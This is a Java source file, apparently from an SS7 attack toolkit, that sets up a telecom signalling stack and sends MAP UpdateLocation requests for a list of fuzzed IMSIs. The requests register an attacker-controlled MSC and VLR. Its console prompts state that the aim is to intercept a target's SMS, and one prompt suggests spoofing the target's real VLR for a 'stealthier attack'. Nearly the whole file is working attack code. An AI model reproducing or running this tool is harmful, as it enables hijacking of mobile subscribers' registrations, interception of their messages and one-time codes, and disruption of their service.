
/**
 * Created by gh0 on 10/2/16.
 */

import java.io.File;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.util.List;
import java.util.Scanner;

import org.mobicents.protocols.api.IpChannelType;
import org.mobicents.protocols.sctp.ManagementImpl;
import org.mobicents.protocols.ss7.indicator.NatureOfAddress;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.m3ua.ExchangeType;
import org.mobicents.protocols.ss7.m3ua.Functionality;
import org.mobicents.protocols.ss7.m3ua.IPSPType;
import org.mobicents.protocols.ss7.m3ua.impl.AspImpl;
import org.mobicents.protocols.ss7.m3ua.impl.M3UAManagementImpl;
import org.mobicents.protocols.ss7.m3ua.impl.parameter.ParameterFactoryImpl;
import org.mobicents.protocols.ss7.m3ua.parameter.RoutingContext;
import org.mobicents.protocols.ss7.m3ua.parameter.TrafficModeType;
import org.mobicents.protocols.ss7.map.MAPStackImpl;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextVersion;
import org.mobicents.protocols.ss7.map.api.MAPDialog;
import org.mobicents.protocols.ss7.map.api.MAPDialogListener;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.MAPMessage;
import org.mobicents.protocols.ss7.map.api.MAPProvider;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortProviderReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortSource;
import org.mobicents.protocols.ss7.map.api.dialog.MAPNoticeProblemDiagnostic;
import org.mobicents.protocols.ss7.map.api.dialog.MAPRefuseReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPUserAbortChoice;
//import org.mobicents.protocols.ss7.map.api.dialog.MAPProviderError;
import org.mobicents.protocols.ss7.map.api.errors.MAPErrorMessage;
import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
import org.mobicents.protocols.ss7.map.api.primitives.AddressString;
import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
import org.mobicents.protocols.ss7.map.api.primitives.ISDNAddressString;
import org.mobicents.protocols.ss7.map.api.primitives.MAPExtensionContainer;
import org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPDialogMobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPServiceMobilityListener;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ForwardCheckSSIndicationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ResetRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.CancelLocationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.CancelLocationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.PurgeMSRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.PurgeMSResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.SendIdentificationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.SendIdentificationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateGprsLocationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateGprsLocationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateLocationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateLocationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeRequest_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeResponse_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeSubscriptionInterrogationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeSubscriptionInterrogationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.DeleteSubscriberDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.DeleteSubscriberDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.InsertSubscriberDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.InsertSubscriberDataResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.AlertServiceCentreRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.AlertServiceCentreResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.ForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.InformServiceCentreRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MAPServiceSmsListener;
import org.mobicents.protocols.ss7.map.api.service.sms.MoForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MoForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.MtForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MtForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.NoteSubscriberPresentRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReadyForSMRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReadyForSMResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.ReportSMDeliveryStatusRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReportSMDeliveryStatusResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMResponse;
import org.mobicents.protocols.ss7.sccp.OriginationType;
import org.mobicents.protocols.ss7.sccp.RuleType;
import org.mobicents.protocols.ss7.sccp.SccpProvider;
import org.mobicents.protocols.ss7.sccp.SccpResource;
import org.mobicents.protocols.ss7.sccp.impl.SccpStackImpl;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle0100;
import org.mobicents.protocols.ss7.sccp.parameter.SccpAddress;
import org.mobicents.protocols.ss7.tcap.TCAPStackImpl;
import org.mobicents.protocols.ss7.tcap.api.TCAPStack;
import org.mobicents.protocols.ss7.tcap.asn.ApplicationContextName;
import org.mobicents.protocols.ss7.tcap.asn.comp.Problem;

abstract class FUlLowLevel implements MAPDialogListener, MAPServiceMobilityListener, MAPServiceSmsListener {

    // MTP Details
    protected int CLIENT_SPC;
    protected int SERVER_SPC; // PC of adjacent STP

    protected int NETWORK_INDICATOR; // International

    protected final int SERVICE_INDICATOR = 3; // SCCP
    protected final int SSN_Client = 7; // VLR SSN
    protected final int SSN_Server = 6; // HLR SSN
    protected final int SSN_MSC = 8; // Target Legitimate MSC

    // M3UA details
    protected String CLIENT_IP;
    protected int CLIENT_PORT;

    protected String SERVER_IP;
    protected int SERVER_PORT;

    protected final String CLIENT_ASSOCIATION_NAME = "clientAsscoiation";

    String attacker_msc;
    String attacker_vlr;

    String target_msc;
    String target_imsiGT;

    List<String> fuzzy_imsi;

    protected final ParameterFactoryImpl factory = new ParameterFactoryImpl();

    protected FUlLowLevel() {
	init();
    }

    public void init() {
	try {
	    Scanner user_input = new Scanner(System.in);

	    System.out.print("\033[34m[*]\033[0mSet Client PC: ");
	    CLIENT_SPC = user_input.nextInt();
	    System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
	    SERVER_SPC = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet Client IP: ");
	    CLIENT_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet Client Port: ");
	    CLIENT_PORT = user_input.nextInt();
	    System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
	    SERVER_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
	    SERVER_PORT = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [2] National: ");
	    NETWORK_INDICATOR = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet file containing fuzzy strings for IMSI (path + filename): ");
	    String fuzzy_strings_file = user_input.next();

	    System.out.print("\033[34m[*]\033[0mSet a valid IMSI in GT Format [ mcc+mnc+msin --> cc+ndc+msin ]: ");
	    target_imsiGT = user_input.next();

	    fuzzy_imsi = Files.readAllLines(new File(fuzzy_strings_file).toPath(), Charset.defaultCharset());

	    System.out.print("\033[34m[*]\033[0mSet Your MSC GT to Intercept SMS: ");
	    attacker_msc = user_input.next();

	    System.out.print(
		    "\033[34m[*]\033[0mFor a Stealthier attack set the VLR as the real VLR of the target\033[34m[*]\033[0m\n");

	    System.out.print("\033[34m[*]\033[0mSet VLR GT: ");
	    attacker_vlr = user_input.next();

	    System.out.println("\033[34m[*]\033[0mStack components are set...");
	    System.out.println("\033[34m[*]\033[0mInitializing the Stack...");

	} catch (Exception ex) {
	    System.out.println("\033[31m[-]\033[0mError: " + ex.getMessage());
	    throw new RuntimeException(ex);
	}

    }
}

public class FuzzyUpdateLocation extends FUlLowLevel {

    // SCTP
    private ManagementImpl sctpManagement;

    // M3UA
    private M3UAManagementImpl clientM3UAMgmt;

    // SCCP
    private SccpStackImpl sccpStack;
    private SccpProvider sccpProvider;
    private SccpResource sccpResource;

    // TCAP
    private TCAPStack tcapStack;

    // MAP
    private MAPStackImpl mapStack;
    private MAPProvider mapProvider;

    public FuzzyUpdateLocation() {
	// TODO Auto-generated constructor stub
    }

    protected void initializeStack(IpChannelType ipChannelType) throws Exception {

	this.initSCTP(ipChannelType);

	// Initialize M3UA first
	this.initM3UA();

	// Initialize SCCP
	this.initSCCP();

	// Initialize TCAP
	this.initTCAP();

	// Initialize MAP
	this.initMAP();

	// FInally start ASP
	this.clientM3UAMgmt.startAsp("ASP1");
    }

    private void initSCTP(IpChannelType ipChannelType) throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
	try {
	    this.sctpManagement = new ManagementImpl("Client");
	    this.sctpManagement.setSingleThread(true);
	    this.sctpManagement.start();
	    this.sctpManagement.setConnectDelay(10000);
	    this.sctpManagement.removeAllResourses();

	    // 1. Create SCTP Association
	    sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
		    ipChannelType, null);
	    System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initializing SCTP: " + e.getMessage());
	    System.exit(1);
	}
    }

    private void initM3UA() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
	try {
	    this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
	    this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
	    this.clientM3UAMgmt.start();
	    this.clientM3UAMgmt.removeAllResourses();

	    RoutingContext rc = factory.createRoutingContext(new long[] { 100l });
	    TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);

	    this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
		    trafficModeType, 1, null);

	    // Step 2 : Create ASP
	    this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);

	    // Step3 : Assign ASP to AS
	    AspImpl asp = this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");

	    // Step 4: Add Route.
	    clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");

	    System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initializing M3UA: " + e.getMessage());
	    System.exit(2);

	}

    }

    private void initSCCP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");
	try {

	    this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
	    this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);

	    this.sccpStack.start();
	    this.sccpStack.removeAllResourses();

	    this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
	    this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);

	    this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0, null);
	    this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);

	    this.sccpProvider = this.sccpStack.getSccpProvider();

	    // SCCP routing table
	    GlobalTitle0100 remotGTs = this.sccpProvider.getParameterFactory().createGlobalTitle("*", 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);
	    GlobalTitle0100 localMscGT = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_msc, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    GlobalTitle0100 localVlrGT = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_vlr, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    this.sccpStack.getRouter().addRoutingAddress(1, this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server));

	    this.sccpStack.getRouter().addRoutingAddress(2, this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localVlrGT, CLIENT_SPC, SSN_Client));
	    this.sccpStack.getRouter().addRoutingAddress(3, this.sccpProvider.getParameterFactory()
		    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localMscGT, CLIENT_SPC, SSN_MSC));

	    SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server);
	    SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localVlrGT, CLIENT_SPC, SSN_Client);
	    SccpAddress patternLocal_MSC = this.sccpProvider.getParameterFactory()
		    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localMscGT, CLIENT_SPC, SSN_MSC);

	    String maskRemote = "K";
	    String maskLocal = "R";

	    this.sccpStack.getRouter().addRule(1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote,
		    maskRemote, 1, -1, null, 0, null);
	    this.sccpStack.getRouter().addRule(2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal,
		    maskLocal, 2, -1, null, 0, null);
	    this.sccpStack.getRouter().addRule(3, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal_MSC,
		    maskLocal, 2, -1, null, 0, null);

	    System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initializing SCCP: " + e.getMessage());
	    System.exit(3);
	}
    }

    private void initTCAP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
	try {
	    this.tcapStack = new TCAPStackImpl("tcap", this.sccpStack.getSccpProvider(), SSN_Client);
	    this.tcapStack.start();
	    this.tcapStack.setDialogIdleTimeout(6000000);
	    this.tcapStack.setInvokeTimeout(180000);
	    this.tcapStack.setMaxDialogs(2000);

	    System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initializing TCAP: " + e.getMessage());
	    System.exit(4);
	}
    }

    private void initMAP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing MAP Stack ....");
	try {

	    this.mapStack = new MAPStackImpl("MAP-MSC", this.tcapStack.getProvider());
	    this.mapProvider = this.mapStack.getMAPProvider();

	    this.mapProvider.addMAPDialogListener(this);
	    this.mapProvider.getMAPServiceMobility().addMAPServiceListener(this);
	    this.mapProvider.getMAPServiceSms().addMAPServiceListener(this);

	    this.mapProvider.getMAPServiceMobility().acivate();
	    this.mapProvider.getMAPServiceSms().acivate();

	    this.mapStack.start();

	    System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mFailed to Initialize MAP: " + e.getMessage());
	    System.exit(5);
	}
    }

    public void initiateUL() throws MAPException {

	try {

	    // Create of the attacker fake MSC and VLR
	    ISDNAddressString msc = this.mapProvider.getMAPParameterFactory()
		    .createISDNAddressString(AddressNature.international_number, NumberingPlan.ISDN, attacker_msc);

	    ISDNAddressString vlr = this.mapProvider.getMAPParameterFactory()
		    .createISDNAddressString(AddressNature.international_number, NumberingPlan.ISDN, attacker_vlr);

	    GlobalTitle0100 gtVlr = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_vlr, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory()
		    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtVlr, CLIENT_SPC, SSN_Client);
	    // in UL scenario the routing is derived from the IMSI, IMSI(E.212) is exchanged
	    // to the E.214 format
	    GlobalTitle0100 calledIMSIGT = this.sccpProvider.getParameterFactory().createGlobalTitle(target_imsiGT, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_MOBILE, null,
		    NatureOfAddress.INTERNATIONAL);
	    SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calledIMSIGT, SERVER_SPC, SSN_Server);

	    // First create Dialog
	    MAPDialogMobility mapDialog = this.mapProvider.getMAPServiceMobility().createNewDialog(MAPApplicationContext
		    .getInstance(MAPApplicationContextName.networkLocUpContext, MAPApplicationContextVersion.version3),
		    callingParty, null, calledParty, null);

	    for (String fi : fuzzy_imsi) {
		try {
		    // Create IMSI of the target
		    IMSI imsi = this.mapProvider.getMAPParameterFactory().createIMSI(fi);
		    mapDialog.addUpdateLocationRequest(imsi, msc, null, vlr, null, null, null, false, false, null, null,
			    null, false, false);

		    mapDialog.send();
		    System.out.println(
			    "\033[34m[*]\033[0mUpdating Location for Target's IMSI " + fi + " is processing..");
		} catch (Exception e) {
		    System.out.println(
			    "\033[31m[-]\033[0mError sending UL for IMSI : " + fi + ". Exception :" + e.getMessage());
		    System.exit(1);
		}

	    }
	} catch (MAPException e) {
	    System.out.println("\033[31m[-]\033[0mMAP Error: " + e.getMessage());
	    System.out.println("\033[31m[-]\033[0mTerminating Session...");
	    System.exit(6);
	}
    }

    public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
	System.out.printf("\033[31m[-]\033[0mError: DialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s\n ",
		mapDialog.getLocalDialogId(), noticeProblemDiagnostic);
	System.exit(7);
    }

    @Override
    public void onDialogRelease(MAPDialog mapDialog) {

    }

    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
	    MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
	System.out.printf(
		"\033[31m[-]\033[0mError: DialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
	System.exit(8);
    }

    @Override
    public void onDialogClose(MAPDialog mapDialog) {

    }

    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
	    ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
	System.out.printf(
		"\033[31m[-]\033[0mError: DialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
	System.exit(9);
    }

    @Override
    public void onDialogDelimiter(MAPDialog mapDialog) {

    }

    @Override
    public void onDialogRequest(MAPDialog mapDialog, AddressString addressString, AddressString addressString1,
	    MAPExtensionContainer mapExtensionContainer) {

    }

    @Override
    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1,
	    AddressString addressString2, AddressString addressString3) {

    }

    @Override
    public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer mapExtensionContainer) {

    }

    public void onDialogTimeout(MAPDialog mapDialog) {
	System.out.printf("\033[31m[-]\033[0mError: DialogTimeout for DialogId=%d\n", mapDialog.getLocalDialogId());
	System.exit(10);
    }

    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
	    MAPExtensionContainer extensionContainer) {
	System.out.printf(
		"\033[31m[-]\033[0mDialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), userReason, extensionContainer);
	System.exit(11);
    }

    public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {
	System.out.printf("\033[31m[-]\033[0mMAP Error Component for Dialog=%d and invokeId=%d MAPErrorMessage= %s\n",
		mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
	System.exit(12);
    }

    @Override
    public void onRejectComponent(MAPDialog mapDialog, Long aLong, Problem problem, boolean b) {

    }

    public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {

    }

    public void onMAPMessage(MAPMessage mapMessage) {

    }

    public static void main(String args[]) {
	System.out.println("*********************************************");
	System.out.println("*** FUZZING UPDATE LOCATION - FIELD IMSI  ***");
	System.out.println("*********************************************");

	IpChannelType ipChannelType = IpChannelType.SCTP;

	final FuzzyUpdateLocation attacker = new FuzzyUpdateLocation();

	try {
	    attacker.initializeStack(ipChannelType);

	    // Lets pause for 20 seconds so stacks are initialized properly
	    Thread.sleep(20000);
	    attacker.initiateUL();

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initiating Attack: " + e.getMessage());
	    System.exit(14);
	}
    }

    @Override
    public void onActivateTraceModeRequest_Mobility(ActivateTraceModeRequest_Mobility arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onActivateTraceModeResponse_Mobility(ActivateTraceModeResponse_Mobility arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onAnyTimeInterrogationRequest(AnyTimeInterrogationRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onAnyTimeInterrogationResponse(AnyTimeInterrogationResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onAnyTimeSubscriptionInterrogationRequest(AnyTimeSubscriptionInterrogationRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onAnyTimeSubscriptionInterrogationResponse(AnyTimeSubscriptionInterrogationResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onAuthenticationFailureReportRequest(AuthenticationFailureReportRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onAuthenticationFailureReportResponse(AuthenticationFailureReportResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onCancelLocationRequest(CancelLocationRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onCancelLocationResponse(CancelLocationResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onCheckImeiRequest(CheckImeiRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onCheckImeiResponse(CheckImeiResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onDeleteSubscriberDataRequest(DeleteSubscriberDataRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onDeleteSubscriberDataResponse(DeleteSubscriberDataResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onForwardCheckSSIndicationRequest(ForwardCheckSSIndicationRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onInsertSubscriberDataRequest(InsertSubscriberDataRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onInsertSubscriberDataResponse(InsertSubscriberDataResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onProvideSubscriberInfoRequest(ProvideSubscriberInfoRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onProvideSubscriberInfoResponse(ProvideSubscriberInfoResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onPurgeMSRequest(PurgeMSRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onPurgeMSResponse(PurgeMSResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onResetRequest(ResetRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onRestoreDataRequest(RestoreDataRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onRestoreDataResponse(RestoreDataResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onSendAuthenticationInfoRequest(SendAuthenticationInfoRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onSendAuthenticationInfoResponse(SendAuthenticationInfoResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onSendIdentificationRequest(SendIdentificationRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onSendIdentificationResponse(SendIdentificationResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onUpdateGprsLocationRequest(UpdateGprsLocationRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onUpdateGprsLocationResponse(UpdateGprsLocationResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onUpdateLocationRequest(UpdateLocationRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onUpdateLocationResponse(UpdateLocationResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onAlertServiceCentreRequest(AlertServiceCentreRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onAlertServiceCentreResponse(AlertServiceCentreResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onForwardShortMessageRequest(ForwardShortMessageRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onForwardShortMessageResponse(ForwardShortMessageResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onInformServiceCentreRequest(InformServiceCentreRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onMoForwardShortMessageRequest(MoForwardShortMessageRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onMoForwardShortMessageResponse(MoForwardShortMessageResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onMtForwardShortMessageRequest(MtForwardShortMessageRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onMtForwardShortMessageResponse(MtForwardShortMessageResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onNoteSubscriberPresentRequest(NoteSubscriberPresentRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onReadyForSMRequest(ReadyForSMRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onReadyForSMResponse(ReadyForSMResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onReportSMDeliveryStatusRequest(ReportSMDeliveryStatusRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onReportSMDeliveryStatusResponse(ReportSMDeliveryStatusResponse arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onSendRoutingInfoForSMRequest(SendRoutingInfoForSMRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onSendRoutingInfoForSMResponse(SendRoutingInfoForSMResponse arg0) {
	// TODO Auto-generated method stub

    }

}